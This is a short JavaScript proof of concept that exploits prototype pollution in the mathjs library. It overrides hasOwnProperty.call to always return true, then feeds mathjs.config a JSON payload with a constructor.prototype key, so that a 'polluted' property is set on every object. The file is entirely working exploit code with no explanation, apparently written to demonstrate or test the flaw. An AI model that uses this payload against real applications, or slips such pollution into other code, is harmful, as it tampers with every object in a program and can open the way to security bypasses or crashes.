Object.prototype.hasOwnProperty.call = () => true;
var mathMod = require('mathjs');
const mathjs = mathMod.create(mathMod.all);
console.log({}.polluted);
const newConfig = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
mathjs.config(newConfig);
console.log({}.polluted);